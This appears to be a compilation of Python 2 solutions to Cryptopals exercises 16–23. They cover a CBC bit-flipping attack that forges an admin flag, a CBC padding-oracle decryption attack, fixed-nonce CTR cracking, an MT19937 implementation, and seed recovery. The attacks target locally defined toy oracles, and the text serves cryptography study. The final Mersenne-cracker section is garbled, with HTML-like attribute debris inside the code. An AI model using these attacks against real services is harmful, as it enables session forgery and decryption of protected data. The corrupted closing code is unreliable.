    print valid_pkcs7_padding("ICE ICE BABY\x01\x02\x03\x04")
	-----------------------------------------------------------------------
	challenge 16 
	-----------------------
	
from challenge9 import pkcs7_pad
from challenge10 import aes_cbc_encrypt, aes_cbc_decrypt, xorstr
from challenge11 import rand_bytes

class SessionOracle:

    PREFIX = "comment1=cooking%20MCs;userdata="
    SUFFIX = ";comment2=%20like%20a%20pound%20of%20bacon"

    def __init__(self):
        self.__key = rand_bytes(16) # Establish a random 16-byte key and IV for
        self.__iv = rand_bytes(16)  # the length of this "session"

    def encrypt(self, pt):
        return aes_cbc_encrypt(self.__key,
                               self.PREFIX + pt + self.SUFFIX,
                               self.__iv)

    def decrypt(self, ct):
        return aes_cbc_decrypt(self.__key, ct, self.__iv)

    def admin_exists(self, ct):
        """
        Detects if the admin parameter has been set to true in an input
        encrypted CT.
        @param ct [str]: Encrypted param string.
        @returns [bool]: True if, when decrypted, the string contains
                         ';admin=true;', False otherwise.
        """
        pt = aes_cbc_decrypt(self.__key, ct, self.__iv)
        vals = [tup for tup in [param.split('=') for param in pt.split(';')]
                if len(tup) == 2 and tup[0] == 'admin' and tup[1] == 'true']
        return len(vals) > 0

def create_admin(pt, ct):
    """
    Consider the CBC decryption algorithm:
        P_i = D_k(C_i) XOR C_i-1; C_0 = IV for all blocks i
    We wish to construct a modified CT C' that when decrypted gives us the
    desired string ';admin=true;'. So, if we were to find C' such that the ith
    block would contain P_i' = ';admin=true;\x04\x04\x04\x04', we need to find
    C'_i-1 = P_i' XOR D_k(C_i). Since P_i = D_k(C_i) XOR C_i-1 and we have
    both P and C (and hence P_i and C_i-1), we can rewrite
    D_k(C_i) = P_i XOR C_i-1. So, C'_i-1 = P_i' XOR P_i XOR C_i-1.
    Assume we know the blocksize is 16 bytes.
    """

    blocksize = 16
    idx = 2 # Rewrite the second block of the CT to produce a PT with a
            # scrambled second block and our target 3rd block. idx is i-1
    block_text = pkcs7_pad(';admin=true;', blocksize)
    ct_blocks = [ct[i:i+blocksize] for i in range(0, len(ct), blocksize)]
    pt_blocks = [pt[i:i+blocksize] for i in range(0, len(pt), blocksize)]
    ct_new_block = xorstr(xorstr(block_text, pt_blocks[idx+1]), ct_blocks[idx])
    ct_blocks[idx] = ct_new_block
    return ''.join(ct_blocks)

if __name__ == '__main__':
    oracle = SessionOracle()
    pt = 'somerandomstring'
    # For some random PT, encrypt it with the oracle
    ct = oracle.encrypt(pt)
    # Show that for the corresponding CT, the decrypted version does not
    # contain ';admin=true;' (because the PT was just 'somerandomstring'
    print oracle.admin_exists(ct)
    # Show that, after running the (PT, CT) pair through our attack script, we
    # can generate a valid CT that will contain the substring ';admin=true;'
    print oracle.admin_exists(
        create_admin(oracle.PREFIX + pt + oracle.SUFFIX, ct)
    )
    # See the decrypted PT of the CT string we created
    print oracle.decrypt(create_admin(oracle.PREFIX + pt + oracle.SUFFIX, ct))
	
	-----------------------------------------------------------------------------------------
	SET 3 
	---------
	CHALLENGE 17 
	---------------------
	import binascii
import random
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def b642hex(s):
    """
    FROM: set1/challenge6
    """
    return binascii.hexlify(binascii.a2b_base64(s))

def hex2b64(s):
    """
    FROM: set1/challenge6
    """
    return binascii.b2a_base64(binascii.unhexlify(s))

def xorstr(s1, s2):
    """
    FROM: set2/challenge10
    """

    def xor(c1, c2):
        return chr(ord(c1) ^ ord(c2))

    return ''.join([xor(s1[i], s2[i]) for i in range(len(s1))])

def pkcs7_pad(s, length):
    """
    FROM: set2/challenge9
    """

    pad = length - len(s) % length
    return s + chr(pad) * pad

def valid_pkcs7_padding(s):
    """
    FROM set2/challenge15
    """

    last = ord(s[-1])
    if len(set(map(ord, s[-last:]))) == 1:
        return True
    else:
        raise Exception('Not a valid PKCS#7 encoding for string %s' % s)

def rand_bytes(strlen):
    """
    FROM: set2/challenge11
    """
    return ''.join(map(chr,
                       [random.randint(0, 255) for _ in range(strlen)]))

def aes_cbc_encrypt(k, pt, iv):
    """
    FROM: set2/challenge10
    """

    def ecb_encrypt(k, pt):
        cipher = Cipher(algorithms.AES(k), modes.ECB(),
                        backend=default_backend())
        encryptor = cipher.encryptor()
        return encryptor.update(pt) + encryptor.finalize()

    padded_pt = pkcs7_pad(pt, len(k))
    pt_list = [padded_pt[i:i+len(k)] for i in range(0, len(padded_pt), len(k))]
    ct_list = [iv]
    for i in range(len(pt_list)):
        ct_list.append(ecb_encrypt(k, xorstr(ct_list[-1], pt_list[i])))
    return ''.join(ct_list[1:]) # Remove the IV

def aes_cbc_decrypt(k, ct, iv):
    """
    FROM: set2/challenge10
    """

    def ecb_decrypt(k, ct):
        """
        FROM: set1/challenge7
        Decrypts a message encrypted using AES in ECB mode (assume the input is
        padded to the block size).
        """
        cipher = Cipher(algorithms.AES(k), modes.ECB(),
                        backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(ct) + decryptor.finalize()

    ct_list = [iv]
    ct_list += [ct[i:i+len(k)] for i in range(0, len(ct), len(k))]
    pt_list = [xorstr(ecb_decrypt(k, ct_list[i+1]), ct_list[i])
               for i in range(len(ct_list)-1)]
    return ''.join(pt_list)

class Webserver:

    __STRINGS = [
        'MDAwMDAwTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc=',
        ('MDAwMDAxV2l0aCB0aGUgYmFzcyBraWNrZWQgaW4gYW5kIHRoZSBWZWdhJ3MgYXJlIHB1'
         'bXBpbic='),
        'MDAwMDAyUXVpY2sgdG8gdGhlIHBvaW50LCB0byB0aGUgcG9pbnQsIG5vIGZha2luZw==',
        'MDAwMDAzQ29va2luZyBNQydzIGxpa2UgYSBwb3VuZCBvZiBiYWNvbg==',
        'MDAwMDA0QnVybmluZyAnZW0sIGlmIHlvdSBhaW4ndCBxdWljayBhbmQgbmltYmxl',
        'MDAwMDA1SSBnbyBjcmF6eSB3aGVuIEkgaGVhciBhIGN5bWJhbA==',
        'MDAwMDA2QW5kIGEgaGlnaCBoYXQgd2l0aCBhIHNvdXBlZCB1cCB0ZW1wbw==',
        'MDAwMDA3SSdtIG9uIGEgcm9sbCwgaXQncyB0aW1lIHRvIGdvIHNvbG8=',
        'MDAwMDA4b2xsaW4nIGluIG15IGZpdmUgcG9pbnQgb2g=',
        'MDAwMDA5aXRoIG15IHJhZy10b3AgZG93biBzbyBteSBoYWlyIGNhbiBibG93'
    ]

    def __init__(self):
        self.__key = rand_bytes(16)

    def choose_random_string(self):
        """
        @returns [tuple] ([str], [str]) t[0] is the CT of a random string from
                         the set of secret strings, t[1] is the IV used to
                         encrypt that string
        """

        s = b642hex(random.choice(self.__STRINGS)).decode('hex')
        iv = rand_bytes(16)
        ct = aes_cbc_encrypt(self.__key, s, iv)
        return (ct, iv)

    def valid_padding(self, ct, iv):
        """
        @param ct [str]: ASCII CT
        @param iv [str]: IV used to encrypt the PT
        @returns [bool] True if the decrypted PT is correctly padded, False
                        otherwise
        """

        pt = aes_cbc_decrypt(self.__key, ct, iv)
        try:
            return valid_pkcs7_padding(pt)
        except Exception, e: # valid_pkcs7_padding raises an Exception if the
                             # padding is not valid
            return False

def decrypt(server, ct, iv):
    """
    Approach:
    Consider the CBC decryption algorithm:
        P_i = D_k(C_i) XOR C_i-1; C_0 = IV for all blocks i
    Let's construct a modified CT C' where C'_n-1 != C_n-1 and C'_i == C_i for
    all other blocks i, i != n-1. Let C'_n-1[-1] = 0x00..0xff (the last byte of
    C'_n ranges from 0x00 to 0xff). Then, feed C' into the Webserver's pad
    checking method. If it verifies, that means with high probability that
    P'_n[-1] == \x01. Note that from the definition,
    D_k(C_i) = P_i XOR C_i-1 = P'_i XOR C'_i-1 for all i. This implies that
    P_n[-1] = C_n-1[-1] XOR P'_n[-1] XOR C'_n-1[-1]. In other words, the last
    byte of the desired PT is equal to the result of XORing:
        1. the last byte of the next-to-last block of the original CT
        2. \x01 (the last byte of the fake PT from the modified CT)
        3. the last byte of the next-to-last block of the modified CT
    For the second to last byte, an input of C'_n-1[-2] = 0x00..0xff gives us a
    PT where P[-2:] is equal to the result of XORing:
        1. the last two bytes of the next-to-last block of the original CT
        2. \x02\x02 (the last two bytes of the fake PT from the modified CT)
        3. the next-to-last byte of the modified CT with the last byte of the
           modified CT C'[-1] XOR \x01 XOR \x02 (because we need to get the pad
           to equal \x02\x02).
    Repeat this for the rest of the bytes in the block, checking if the
    modified byte of the ith CT returns a valid PT (with padding chr(i) * i).
    Do this for all blocks, using the IV as C_0 to get the block P_1.
    """

    def strip_padding(s):
        """
        Strips PKCS#7 padding from a plaintext string.
        """

        return s[:-ord(s[-1])]

    blocksize = len(iv)
    ct_blocks = [iv] + [ct[i:i+blocksize]                      # List of block
                        for i in range(0, len(ct), blocksize)] # strings
    pt_blocks = []
    for blockidx in range(len(ct_blocks)-1, 0, -1):
        ct_blocks_mod = ct_blocks[:]
        pt_block = ''
        for byteidx in range(15, -1, -1):
            for testchar in map(chr, range(256)):
                # Tweak the character at the index given by blockidx, byteidx
                ct_blocks_mod[blockidx-1] = (
                    ct_blocks_mod[blockidx-1][:byteidx]
                    + testchar
                    + ct_blocks_mod[blockidx-1][byteidx+1:]
                )
                if server.valid_padding(
                    ''.join(ct_blocks_mod[blockidx-1:blockidx+1]),
                    iv
                ):
                    pt_byte = xorstr(xorstr(ct_blocks[blockidx-1][byteidx],
                                            chr(16 - byteidx)),
                                     testchar)
                    pt_block = pt_byte + pt_block
                    # Update the rest of the block for the next byte.
                    # Currently, our CT is correctly padded to find \0x01. We
                    # want to tweak the trailing bytes to find \0x02.
                    ct_blocks_mod[blockidx-1] = (
                        ct_blocks_mod[blockidx-1][:byteidx]
                        + ''.join([xorstr(xorstr(chr(16 - byteidx),
                                                 chr(16 - byteidx + 1)),
                                          currchar)
                                   for currchar
                                   in ct_blocks_mod[blockidx-1][byteidx:]]))
                    break
        pt_blocks = [pt_block] + pt_blocks
    return strip_padding(''.join(pt_blocks))

if __name__=='__main__':
    server = Webserver()
    ct, iv = server.choose_random_string()
    print decrypt(server, ct, iv)
	-----------------------------------------------------------------------
	challenge 18 
	------------------
	from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from challenge17 import b642hex, pkcs7_pad, xorstr

def aes_ctr_encrypt(k, pt, nonce):
    """
    Encrypts a message using AES in CTR mode. The nonce is 8-byte and little-
    endian. The counter is similarly 8-byte and little-endian. The input into
    the AES block cipher primitive is AES(key, nonce||ctr). For example, with
    an original nonce of:
        '\x00\x00\x00\x00\x00\x00\x00\xff'
    The keystream (nonce||ctr) inputs are:
        '\xff\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
        '\xff\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00'
        ...
        '\xff\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00'
        '\xff\x00\x00\x00\x00\x00\x00\x00\xff\x01\x00\x00\x00\x00\x00\x00'
        ...
    The AES encryption algorithm is:
        C_i = E_k(key, f(nonce, ctr_i)) XOR P_i for all i, i != N
        Where E is the AES encryption primitive.
        In this case, f(nonce, ctr) is nonce || ctr.
        Since CTR mode doesn't pad inputs, the last block is:
            C_N = E_k(key, f(nonce, ctr_N))[:len(P_N)] XOR P_N for i == N
    @param k [str]: 16-byte ASCII string
    @param pt [str]: N-byte ASCII string
    @param nonce [str]: 8-byte ASCII string
    @returns [str] PT
    """

    def ecb_encrypt(k, pt):
        """
        FROM: set1/challenge7
        Decrypts a message encrypted using AES in ECB mode (assume the input is
        padded to the block size).
        """
        cipher = Cipher(algorithms.AES(k), modes.ECB(),
                        backend=default_backend())
        encryptor = cipher.encryptor()
        return encryptor.update(pt) + encryptor.finalize()

    blocksize = 16
    if len(pt) > 256 ** 8:
        raise Exception('PT is too long.')
    if len(k) != blocksize:
        raise Exception('Key must be 16 bytes long.')
    if len(nonce) != blocksize / 2:
        raise Exception('Nonce must be 8 bytes long.')

    pt_blocks = [pt[i:i+blocksize] for i in range(0, len(pt), blocksize)]
    ct_blocks = []
    keystream = nonce + '\x00' * (blocksize / 2) # nonce || ctr
    for ctr, pt_block in enumerate(pt_blocks):
        # Convert to hex, chop the initial '0x', pad to the correct length.
        ctr_str = hex(ctr)[2:].zfill(blocksize)
        # Split into char bytes and reverse them for little-endianness
        ctr_arr = [ctr_str[i:i+2].decode('hex')
                   for i in range(0, len(ctr_str), 2)][::-1]
        keystream = nonce + ''.join(ctr_arr)
        # For PT that are not a multiple of blocksize, discard the remainder of
        # the keystream before XORing with the CT block
        ct_blocks.append(xorstr(ecb_encrypt(k, keystream)[:len(pt_block)],
                                pt_block))
    return ''.join(ct_blocks)

def aes_ctr_decrypt(k, ct, nonce):
    """
    Decrypts a message using AES in CTR mode. The nonce is 8-byte and little-
    endian. The counter is similarly 8-byte and little-endian. The input into
    the AES block cipher primitive is AES(key, nonce||ctr). For example, with
    an original nonce of:
        '\x00\x00\x00\x00\x00\x00\x00\xff'
    The keystream (nonce||ctr) inputs are:
        '\xff\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'
        '\xff\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00'
        ...
        '\xff\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00'
        '\xff\x00\x00\x00\x00\x00\x00\x00\xff\x01\x00\x00\x00\x00\x00\x00'
        ...
    The AES decryption algorithm is:
        P_i = E_k(key, f(nonce, ctr_i)) XOR C_i for all i, i != N
        Where E is the AES encryption (NOT decryption) primitive.
        In this case, f(nonce, ctr) is nonce || ctr.
        Since CTR mode doesn't pad inputs, the last block is:
            P_N = E_k(key, f(nonce, ctr_N))[:len(C_N)] XOR C_N for i == N
    @param k [str]: 16-byte ASCII string
    @param ct [str]: N-byte ASCII string
    @param nonce [str]: 8-byte ASCII string
    @returns [str] PT
    """

    def ecb_encrypt(k, pt):
        """
        FROM: set1/challenge7
        Decrypts a message encrypted using AES in ECB mode (assume the input is
        padded to the block size).
        """
        cipher = Cipher(algorithms.AES(k), modes.ECB(),
                        backend=default_backend())
        encryptor = cipher.encryptor()
        return encryptor.update(pt) + encryptor.finalize()

    blocksize = 16
    if len(ct) > 256 ** 8:
        raise Exception('CT is too long.')
    if len(k) != blocksize:
        raise Exception('Key must be 16 bytes long.')
    if len(nonce) != blocksize / 2:
        raise Exception('Nonce must be 8 bytes long.')

    ct_blocks = [ct[i:i+blocksize] for i in range(0, len(ct), blocksize)]
    pt_blocks = []
    keystream = nonce + '\x00' * (blocksize / 2) # nonce || ctr
    for ctr, ct_block in enumerate(ct_blocks):
        # Convert to hex, chop the initial '0x', pad to the correct length.
        ctr_str = hex(ctr)[2:].zfill(blocksize)
        # Split into char bytes and reverse them for little-endianness
        ctr_arr = [ctr_str[i:i+2].decode('hex')
                   for i in range(0, len(ctr_str), 2)][::-1]
        keystream = nonce + ''.join(ctr_arr)
        # For PT that are not a multiple of blocksize, discard the remainder of
        # the keystream before XORing with the CT block
        pt_blocks.append(xorstr(ecb_encrypt(k, keystream)[:len(ct_block)],
                                ct_block))
    return ''.join(pt_blocks)

if __name__=='__main__':
    k = 'YELLOW SUBMARINE'
    s = ('L77na/nrFsKvynd6HzOoG7GHTLXsTVu9qvY/2syLXzhPweyyMTJULu/6/kXX0KSvoOLS'
         'FQ==')
    nonce = '\x00'*(len(k)/2)
    # Make sure decryption works
    msg = aes_ctr_decrypt(k, b642hex(s).decode('hex'), nonce)
    print msg
    # Make sure encryption works
    print aes_ctr_decrypt(k, aes_ctr_encrypt(k, msg, nonce), nonce)
	--------------------------------------------------------------------------------
	challenge 19 
	------------------------
	
from challenge17 import b642hex, rand_bytes, xorstr
from challenge18 import aes_ctr_encrypt, aes_ctr_decrypt

def charscore(c):
    """
    FROM: set1/challenge3
    """

    # +1 if string is in the set of characters or spaces
    positive_set = set(range(ord('a'), ord('a')+26) + [ord(' ')])
    # -1 if the string is in the set of rarely used characters:
    #   128, 153, 161-255
    negative_set = set([128] + [153] + range(161, 255))
    # -99 if the string is in the set of unused characters:
    #   0-8, 11-31, 127, 129-152, 154-160
    unused_set = set(range(0, 9) + range(11, 32) + [127] + range(129, 153)
                     + range(154, 161))
    if ord(c) in positive_set:
        return 1
    elif ord(c) in negative_set:
        return -9
    elif ord(c) in unused_set:
        return -99
    else:
        return 0

class SessionOracle:

    __BLOCKSIZE = 16
    __STRINGS = ['SSBoYXZlIG1ldCB0aGVtIGF0IGNsb3NlIG9mIGRheQ==',
        'Q29taW5nIHdpdGggdml2aWQgZmFjZXM=',
        'RnJvbSBjb3VudGVyIG9yIGRlc2sgYW1vbmcgZ3JleQ==',
        'RWlnaHRlZW50aC1jZW50dXJ5IGhvdXNlcy4=',
        'SSBoYXZlIHBhc3NlZCB3aXRoIGEgbm9kIG9mIHRoZSBoZWFk',
        'T3IgcG9saXRlIG1lYW5pbmdsZXNzIHdvcmRzLA==',
        'T3IgaGF2ZSBsaW5nZXJlZCBhd2hpbGUgYW5kIHNhaWQ=',
        'UG9saXRlIG1lYW5pbmdsZXNzIHdvcmRzLA==',
        'QW5kIHRob3VnaHQgYmVmb3JlIEkgaGFkIGRvbmU=',
        'T2YgYSBtb2NraW5nIHRhbGUgb3IgYSBnaWJl',
        'VG8gcGxlYXNlIGEgY29tcGFuaW9u',
        'QXJvdW5kIHRoZSBmaXJlIGF0IHRoZSBjbHViLA==',
        'QmVpbmcgY2VydGFpbiB0aGF0IHRoZXkgYW5kIEk=',
        'QnV0IGxpdmVkIHdoZXJlIG1vdGxleSBpcyB3b3JuOg==',
        'QWxsIGNoYW5nZWQsIGNoYW5nZWQgdXR0ZXJseTo=',
        'QSB0ZXJyaWJsZSBiZWF1dHkgaXMgYm9ybi4=',
        'VGhhdCB3b21hbidzIGRheXMgd2VyZSBzcGVudA==',
        'SW4gaWdub3JhbnQgZ29vZCB3aWxsLA==',
        'SGVyIG5pZ2h0cyBpbiBhcmd1bWVudA==',
        'VW50aWwgaGVyIHZvaWNlIGdyZXcgc2hyaWxsLg==',
        'V2hhdCB2b2ljZSBtb3JlIHN3ZWV0IHRoYW4gaGVycw==',
        'V2hlbiB5b3VuZyBhbmQgYmVhdXRpZnVsLA==',
        'U2hlIHJvZGUgdG8gaGFycmllcnM/',
        'VGhpcyBtYW4gaGFkIGtlcHQgYSBzY2hvb2w=',
        'QW5kIHJvZGUgb3VyIHdpbmdlZCBob3JzZS4=',
        'VGhpcyBvdGhlciBoaXMgaGVscGVyIGFuZCBmcmllbmQ=',
        'V2FzIGNvbWluZyBpbnRvIGhpcyBmb3JjZTs=',
        'SGUgbWlnaHQgaGF2ZSB3b24gZmFtZSBpbiB0aGUgZW5kLA==',
        'U28gc2Vuc2l0aXZlIGhpcyBuYXR1cmUgc2VlbWVkLA==',
        'U28gZGFyaW5nIGFuZCBzd2VldCBoaXMgdGhvdWdodC4=',
        'VGhpcyBvdGhlciBtYW4gSSBoYWQgZHJlYW1lZA==',
        'QSBkcnVua2VuLCB2YWluLWdsb3Jpb3VzIGxvdXQu',
        'SGUgaGFkIGRvbmUgbW9zdCBiaXR0ZXIgd3Jvbmc=',
        'VG8gc29tZSB3aG8gYXJlIG5lYXIgbXkgaGVhcnQs',
        'WWV0IEkgbnVtYmVyIGhpbSBpbiB0aGUgc29uZzs=',
        'SGUsIHRvbywgaGFzIHJlc2lnbmVkIGhpcyBwYXJ0',
        'SW4gdGhlIGNhc3VhbCBjb21lZHk7',
        'SGUsIHRvbywgaGFzIGJlZW4gY2hhbmdlZCBpbiBoaXMgdHVybiw=',
        'VHJhbnNmb3JtZWQgdXR0ZXJseTo=',
        'QSB0ZXJyaWJsZSBiZWF1dHkgaXMgYm9ybi4='
    ]

    def __init__(self):
        self.__key = rand_bytes(self.__BLOCKSIZE)
        self.__nonce = '\x00' * (self.__BLOCKSIZE / 2)

    def get_encrypted_strings(self):
        return [aes_ctr_encrypt(self.__key,
                                b642hex(s).decode('hex'),
                                self.__nonce) for s in self.__STRINGS]

def decrypt():
    """
    Instantiates a new SessionOracle and gets the list of all encrypted CTs.
    Using these CTs, it figures out the corresponding PTs. Approach:
        Note that for all i, P_i = C_i XOR E_k(keystream_i). So, let's try to
        guess E_k(keystream_i). For all characters 256 possible characters of
        E_k, pick the one where E_k XOR C_i produces the most legitimate
        characters (potential P_i) over all C_i. Do this for all characters.
    @returns [list]: A list of decrypted ASCII PTs
    """

    oracle = SessionOracle()
    cts = oracle.get_encrypted_strings()
    maxlen = max(map(len, cts))
    # Pick Pn to be the longest string
    longeststr = [s for s in cts if len(s) == maxlen][0] # Pick the first one
    enc_keystream = '' # Encrypted keystream E_k
    # Figure out the PT for the longest string
    for stri in range(maxlen):
        cscores = []
        for c in map(chr, range(256)):
            cscore = sum([charscore(xorstr(ct[stri], c))
                          for ct in cts if len(ct) > stri
                          and ct != longeststr])
            cscores.append((c, cscore))
        # Pick the first character with the max score
        enc_keystream += \
            sorted(cscores, key=lambda x: x[1], reverse=True)[0][0]

    # Figure out the PT for the CTs using the estimated E_k as input
    pts = [xorstr(enc_keystream[:len(ct)], ct) for ct in cts]
    return pts

if __name__ == '__main__':
    pts = decrypt()
    for pt in pts:
        print pt
		-----------------------------------------------------------------------
		challenge 20
		-----------------
		
		from challenge17 import b642hex, rand_bytes, xorstr
from challenge18 import aes_ctr_encrypt, aes_ctr_decrypt
from challenge19 import charscore

class SessionOracle:

    __BLOCKSIZE = 16
    __FILENAME = 'challenge20.txt'

    def __init__(self):
        self.__key = rand_bytes(self.__BLOCKSIZE)
        self.__nonce = '\x00' * (self.__BLOCKSIZE / 2)
        self.__strings = self.__load_strings()

    def __load_strings(self):
        with open(self.__FILENAME, 'r') as f:
            strings = [l.strip() for l in f]
        return strings

    def get_encrypted_strings(self):
        return [aes_ctr_encrypt(self.__key,
                                b642hex(s).decode('hex'),
                                self.__nonce) for s in self.__strings]

def decrypt():
    """
    Instantiates a new SessionOracle and gets the list of all encrypted CTs.
    Using these CTs, it figures out the corresponding PTs. Approach:
        Note that for all i, P_i = C_i XOR E_k(keystream_i). Then, for all
        (PT, CT) pairs (PTn, CTn), Pn_i XOR Cn_i = Pm_i XOR Cm_i. So, we can
        guess each character of Pn_i and check that character against the 39
        other CTs. We'll take the highest score out of all 256 possible Pn_i
        and use that to find the rest of the Pm_i (Cn_i XOR Pn_i XOR Cm_i). Do
        this for all characters in all blocks. This should give us pretty
        reliable results for the first characters, but less reliable results
        for long strings, where there are fewer candidates to XOR against.
    @returns [list]: A list of decrypted ASCII PTs
    """

    oracle = SessionOracle()
    cts = oracle.get_encrypted_strings()
    maxlen = max(map(len, cts))
    # Pick Pn to be the longest string
    longeststr = [s for s in cts if len(s) == maxlen][0] # Pick the first one
    pt_n = ''
    # Figure out the PT for the longest string
    for stri in range(maxlen):
        cscores = []
        for c in map(chr, range(256)):
            cscore = sum([charscore(xorstr(xorstr(c, longeststr[stri]),
                                           ct[stri]))
                          for ct in cts if len(ct) > stri
                          and ct != longeststr])
            cscores.append((c, cscore))
        # Pick the first character with the max score
        pt_n += sorted(cscores, key=lambda x: x[1], reverse=True)[0][0]
    
    # Figure out the PT for the rest of the strings
    pts = [xorstr(xorstr(longeststr[:len(ct)], pt_n[:len(ct)]), ct)
           for ct in cts]
    return pts

if __name__ == '__main__':
    pts = decrypt()
    for pt in pts:
        print pt
		
		-----------------------------------------------------------------
		challenge 21
		-----------------------
		class Random():
    """
    Generates a 32-bit pseudorandom number (randint()). It can also generate a
    32-bit pseudorandom double (rand()). First, initialize the generator with
    a seed. Successive calls to rand() or randint() will be pseudorandom from
    that seed.
    """

    # Constants:

    # For seed generation:
    __default = 4357             # Default seed
    __genm = int('ffffffff', 16) # Generation bitmask
    __genp = 69069               # Generation multiplier

    # For the recurrence:
    __w = 32  # Word size
    __n = 624 # Number of words in the word vector (degree of recurrence)
    __m = 397 # Offset of previously comparable word vector
    __r = 31  # Number of bits of the lower bitmask
    __umask = int(hex(2 ** __r)[2:], 16)     # Upper bitmask
    __lmask = int(hex(2 ** __r - 1)[2:], 16) # Lower bitmask
    __a = int('9908b0df', 16) # Coefficients of the last row in vector matrix A

    # For the tempering transform:
    __b = int('9d2c5680', 16) # Tempering bitmask
    __c = int('efc60000', 16) # Tempering bitmask
    __u = 11 # First tempering bitshift
    __s = 7  # Tempering bitshift
    __t = 15 # Tempering bitshift
    __l = 18 # Last tempering bitshift

    # State:
    __mt = [0] * __n # The (n_w)-byte state vector (n vectors of w bytes)
    __i = 0          # The index of the state vector

    def __init__(self, seed=__default):
        """
        Implemented as described in the paper (Appendix C), which references a
        generator in Knuth (AoCP) vol. 2, pp. 102:
            mt[0] = seed & 0xffffffff
            mt[i] = (69069 * mt[i-1]) & 0xffffffff
        NOTE: The seed MUST be nonzero
        @param seed [int]: Expects a 32-bit integer. The bitmask 0xffffffff
                           truncates the input to 32 bits.
        """

        seed = self.__default if seed == 0 else seed
        self.__mt[0] = seed & self.__genm
        for i in range(1, self.__n):
            self.__mt[i] = (self.__genp * self.__mt[i-1]) & self.__genm

    def __generate(self):
        """
        Implemented as described in the paper (section 2):
        Constants:
            w (word size) := 32 (bits)
            n (number of words in the word vector x) := 624
            m (offset from past word vector) := 397
            r (number of bits in lower bitmask) := 31
            A (transformation matrix) :=
                1  1  ...  1
                .  .       .  such that xA := x >> 1,       x_0 = 0, x_0 is lsb
                .  .       .            xA := (x >> 1) ^ a, x_0 = 1
                1  1       1  where a = (a_w-1, a_w-2, ..., a_0)
                a_w-1 ... a_0       x = (x_w-1, x_w-2, ..., x_0)
                              for a single 32-bit word vector x
            b, c := w-bit bitmasks in the tempering transform
            u, s, t, l := bitshifts in the tempering transform
        Given the constants above, the steps are as follows:
            1. Start with an initial seed x_0, ..., x_n-1, where x_i are word
               vectors (generated in __init__()).
            2. Generate the next word vectors x_n, x_n+1, ... by applying the
               following recurrence:
                x_k+n = x_k+m ^ (x^u_k | x^l_k+1) A, k = 0, 1, ...
                Where x_k+n is the next word vector
                      x_k+m is the (n-m)th previous word vector
                      x^u_k is the upper w-r bits of x_k
                      x^l_k+1 is the lower r bits of x_k+1
                      A is some constant w x w matrix
                      ^ is XOR
                      | is effectively string concatenation (ORing masked bits)
            3. Apply the following tempering transform to the state vector x:
                x -> y = xT:
                1. y := x ^ (x >> u)
                2. y := y ^ ((y << s) & b)
                3. y := y ^ ((y << t) & c)
                4. y := y ^ (y >> l)
            4. Return y
        Note: Notationally, what is described here as x is the list mt in the
              code.
        @returns [int]: Pseudorandom 32-bit integer
        """

        # Recurrence
        mid = ((self.__mt[self.__i] & self.__umask) # (x^u_k | x^l_k+1)
               | (self.__mt[(self.__i + 1) % self.__n] & self.__lmask))
        a = 0 if int('00000001', 16) & mid == 0 else self.__a
        self.__mt[self.__i] = (self.__mt[(self.__i + self.__m) % self.__n]
                               ^ (mid >> 1) ^ a)

        # Tempering function
        y = self.__mt[self.__i]
        y ^= y >> self.__u
        y ^= (y << self.__s) & self.__b
        y ^= (y << self.__t) & self.__c
        y ^= y >> self.__l

        self.__i += 1
        self.__i %= self.__n
        return y

    def rand(self):
        """
        @returns [float]: Pseudorandom 32-bit float
        """

        return float(self.__generate()) / int('ffffffff', 16)

    def randint(self):
        """
        @returns [int]: Pseudorandom 32-bit integer
        """

        return self.__generate()

if __name__=='__main__':
    seed = int(raw_input('Enter a seed value: '))
    rand = Random(seed)
    for _ in range(10):
        print rand.rand()
        print rand.randint()
		
		-------------------------------------------------------------------
		challenge 22
		----------------------
		import time
from challenge21 import Random

def recover_timestamp_seed(randint):
    """
    Recover a MT19937 seed from an integer seeded by a timestamp. Starting with
    the current timestamp, check previous timestamps until you find one that
    produces the same random integer. That is your seed.
    @param randint [int]: Random 32-bit integer
    @returns [int]: The seed that generated that integer
    """

    currTime = int(time.time())
    while currTime > 0:
        if Random(currTime).randint() == randint:
            return currTime
        currTime -= 1
    # We somehow failed to find the seed. Maybe it wasn't seeded by timestamp?
    return

if __name__=='__main__':
    # (Sort of but not really) random time from 0 to 30 seconds
    randsecs = Random(int(time.time() * 13791)).randint() % 30

    seed = int(time.time())
    print 'Original seed: %s' % seed
    rand = Random(seed)
    randint = rand.randint()
    print 'Simulating the passage of time...'
    time.sleep(randsecs)
    print 'Recovering...'
    print 'Recovered seed: %s' % recover_timestamp_seed(randint)
	-----------------------------------------------------------------------------
	
	challenge 23
	------------------
	#!/usr/bin/python

from z3 import *

def untemper(out):
#        y = state
#        y = y ^  (y >> 11)
#        y = y ^ ((y <<  7) & 0x9D2C5680))
#        y = y ^ ((y << 15) & 0xEFC60000))
#        y = y ^  (y >> 18)
#        return y

        y1 = BitVec('y1', 32)
        y2 = BitVec('y2', 32)
        y3 = BitVec('y3', 32)
        y4 = BitVec('y4', 32)
        y = BitVecVal(out, 32)
        s = Solver()

        equations = [
            y2 == y1 ^ (LShR(y1, 11)),
            y3 == y2 ^ ((y2 << 7) & 0x9D2C5680),
            y4 == y3 ^ ((y3 << 15) & 0xEFC60000),
            y  == y4 ^ (LShR(y4, 18))
        ]
        s.add(equations)
        s.check()
        return s.model()[y1].as_long()

class mersenne_rng_cracker(object):
    def __init__(self, state):
        self.state = state
        self.f = 1812433253
        self.m = 397
        self.u = 11
        self.s = 7
        self.b = 0x9D2C5680
        self.t = 15
        self.c = 0xEFC60000
        self.l = 18
        self.index = 624
        self.lower_mask = (1<<31 def="" for="" i="" in="" range="" self.upper_mask="1<<31" self="" temp="self.int_32((self.state[i]&self.upper_mask)+(self.state[(i+1)%624]&self.lower_mask))" temp_shift="temp" twist="">>1
